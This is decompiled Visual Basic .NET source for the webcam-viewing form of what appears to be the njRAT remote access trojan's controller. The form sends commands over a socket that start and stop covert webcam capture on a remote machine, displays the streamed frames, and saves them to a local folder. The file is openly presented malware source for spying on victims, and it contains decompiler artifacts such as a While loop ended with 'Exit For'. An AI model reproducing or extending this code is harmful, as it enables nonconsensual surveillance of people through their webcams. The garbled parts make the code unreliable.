Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000B RID: 11
	<DesignerGenerated()>
	Public Partial Class Cam
		Inherits Form

		' Token: 0x06000114 RID: 276 RVA: 0x0000A008 File Offset: 0x00008208
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Cam.__ENCList
			SyncLock _ENCList
				If Cam.__ENCList.Count = Cam.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Cam.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Cam.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Cam.__ENCList(num) = Cam.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Cam.__ENCList.RemoveRange(num, Cam.__ENCList.Count - num)
					Cam.__ENCList.Capacity = Cam.__ENCList.Count
				End If
				Cam.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700006F RID: 111
		' (get) Token: 0x06000117 RID: 279 RVA: 0x0000A6B4 File Offset: 0x000088B4
		' (set) Token: 0x06000118 RID: 280 RVA: 0x0000297E File Offset: 0x00000B7E
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x17000070 RID: 112
		' (get) Token: 0x06000119 RID: 281 RVA: 0x0000A6CC File Offset: 0x000088CC
		' (set) Token: 0x0600011A RID: 282 RVA: 0x0000A6E4 File Offset: 0x000088E4
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox1_SelectedIndexChanged
				If Me._ComboBox1 IsNot Nothing Then
					RemoveHandler Me._ComboBox1.SelectedIndexChanged, value2
				End If
				Me._ComboBox1 = value
				If Me._ComboBox1 IsNot Nothing Then
					AddHandler Me._ComboBox1.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000071 RID: 113
		' (get) Token: 0x0600011B RID: 283 RVA: 0x0000A73C File Offset: 0x0000893C
		' (set) Token: 0x0600011C RID: 284 RVA: 0x0000A754 File Offset: 0x00008954
		Friend Overridable Property CheckBox3 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				If Me._CheckBox3 IsNot Nothing Then
					RemoveHandler Me._CheckBox3.CheckedChanged, value2
				End If
				Me._CheckBox3 = value
				If Me._CheckBox3 IsNot Nothing Then
					AddHandler Me._CheckBox3.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000072 RID: 114
		' (get) Token: 0x0600011D RID: 285 RVA: 0x0000A7AC File Offset: 0x000089AC
		' (set) Token: 0x0600011E RID: 286 RVA: 0x0000A7C4 File Offset: 0x000089C4
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000073 RID: 115
		' (get) Token: 0x0600011F RID: 287 RVA: 0x0000A81C File Offset: 0x00008A1C
		' (set) Token: 0x06000120 RID: 288 RVA: 0x0000A834 File Offset: 0x00008A34
		Friend Overridable Property ComboBox2 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox2_SelectedIndexChanged
				If Me._ComboBox2 IsNot Nothing Then
					RemoveHandler Me._ComboBox2.SelectedIndexChanged, value2
				End If
				Me._ComboBox2 = value
				If Me._ComboBox2 IsNot Nothing Then
					AddHandler Me._ComboBox2.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000074 RID: 116
		' (get) Token: 0x06000121 RID: 289 RVA: 0x0000A88C File Offset: 0x00008A8C
		' (set) Token: 0x06000122 RID: 290 RVA: 0x0000A8A4 File Offset: 0x00008AA4
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As PaintEventHandler = AddressOf Me.PictureBox1_Paint
				If Me._PictureBox1 IsNot Nothing Then
					RemoveHandler Me._PictureBox1.Paint, value2
				End If
				Me._PictureBox1 = value
				If Me._PictureBox1 IsNot Nothing Then
					AddHandler Me._PictureBox1.Paint, value2
				End If
			End Set
		End Property

		' Token: 0x17000075 RID: 117
		' (get) Token: 0x06000123 RID: 291 RVA: 0x0000A8FC File Offset: 0x00008AFC
		' (set) Token: 0x06000124 RID: 292 RVA: 0x00002987 File Offset: 0x00000B87
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x17000076 RID: 118
		' (get) Token: 0x06000125 RID: 293 RVA: 0x0000A914 File Offset: 0x00008B14
		' (set) Token: 0x06000126 RID: 294 RVA: 0x0000A92C File Offset: 0x00008B2C
		Friend Overridable Property vmethod_6 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				If Me._vmethod_6 IsNot Nothing Then
					RemoveHandler Me._vmethod_6.Tick, value2
				End If
				Me._vmethod_6 = value
				If Me._vmethod_6 IsNot Nothing Then
					AddHandler Me._vmethod_6.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000077 RID: 119
		' (get) Token: 0x06000127 RID: 295 RVA: 0x0000A984 File Offset: 0x00008B84
		' (set) Token: 0x06000128 RID: 296 RVA: 0x0000A99C File Offset: 0x00008B9C
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick_1
				If Me._Timer1 IsNot Nothing Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				If Me._Timer1 IsNot Nothing Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x06000129 RID: 297 RVA: 0x0000A9F4 File Offset: 0x00008BF4
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Cam_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Cam_Load
			Cam.__ENCAddToList(Me)
			Me.fps = 0
			Me.int_0 = 0
			Me.QQ = String.Empty
			Me.folder = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600012A RID: 298 RVA: 0x0000AA60 File Offset: 0x00008C60
		Private Sub Cam_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				If Me.sk.CN Then
					Me.sk.Send("@")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600012B RID: 299 RVA: 0x0000AAB8 File Offset: 0x00008CB8
		Private Sub Cam_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Me.QQ
				Me.ComboBox2.SelectedIndex = 3
				Me.vmethod_6.Enabled = True
				Me.folder = Me.osk.Folder + "Cam\"
				If Not Directory.Exists(Me.folder) Then
					Directory.CreateDirectory(Me.folder)
				End If
				Try
					Me.ComboBox2.SelectedIndex = Class7.class8_0.int_0
				Catch ex As Exception
					Me.ComboBox2.SelectedIndex = 3
				End Try
				If Class7.class8_0.bool_7 Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				End If
			Catch ex2 As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x0600012C RID: 300 RVA: 0x0000AC38 File Offset: 0x00008E38
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Me.vmethod_6.Enabled = False
			Try
				If Me.osk Is Nothing Or Me.sk Is Nothing Then
					Me.Close()
					Return
				End If
				If Not Me.osk.CN Or Not Me.sk.CN Then
					Me.Close()
				End If
			Catch ex As Exception
			End Try
			Me.int_0 = Me.fps
			If Me.int_0 = 0 Then
				Me.pkt = 0
				Me.PictureBox1.Invalidate()
			End If
			Me.fps = 0
			Me.vmethod_6.Enabled = True
		End Sub

		' Token: 0x0600012D RID: 301 RVA: 0x0000ACF0 File Offset: 0x00008EF0
		Private Sub PictureBox1_Paint(sender As Object, e As PaintEventArgs)
			Try
				Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(CLng(Me.pkt))
				Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(Brushes.Black, rect)
				Dim brush As Brush = Brushes.Red
				If Me.int_0 > 3 Then
					brush = Brushes.YellowGreen
				End If
				If Me.int_0 > 6 Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600012E RID: 302 RVA: 0x0000ADC8 File Offset: 0x00008FC8
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Try
				If Operators.CompareString(Me.Button1.Text, "Start", False) = 0 Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				Else
					Me.Button1.Text = "Start"
					Me.sk.Send("@")
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600012F RID: 303 RVA: 0x0000AE98 File Offset: 0x00009098
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox3.Checked Then
				Try
					Process.Start(Me.folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000130 RID: 304 RVA: 0x0000AEE0 File Offset: 0x000090E0
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem))) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x06000131 RID: 305 RVA: 0x0000AEE0 File Offset: 0x000090E0
		Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem))) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x06000132 RID: 306 RVA: 0x00002990 File Offset: 0x00000B90
		Private Sub Timer1_Tick_1(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x04000079 RID: 121
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400007B RID: 123
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x0400007C RID: 124
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x0400007D RID: 125
		<AccessedThroughProperty("CheckBox3")>
		Private _CheckBox3 As CheckBox

		' Token: 0x0400007E RID: 126
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400007F RID: 127
		<AccessedThroughProperty("ComboBox2")>
		Private _ComboBox2 As ComboBox

		' Token: 0x04000080 RID: 128
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x04000081 RID: 129
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000082 RID: 130
		<AccessedThroughProperty("vmethod_6")>
		Private _vmethod_6 As Timer

		' Token: 0x04000083 RID: 131
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x04000084 RID: 132
		Public folder As String

		' Token: 0x04000085 RID: 133
		Public fps As Integer

		' Token: 0x04000086 RID: 134
		Private int_0 As Integer

		' Token: 0x04000087 RID: 135
		Public osk As Client

		' Token: 0x04000088 RID: 136
		Public pkt As Integer

		' Token: 0x04000089 RID: 137
		Public QQ As String

		' Token: 0x0400008A RID: 138
		Public sk As Client
	End Class
End Namespace
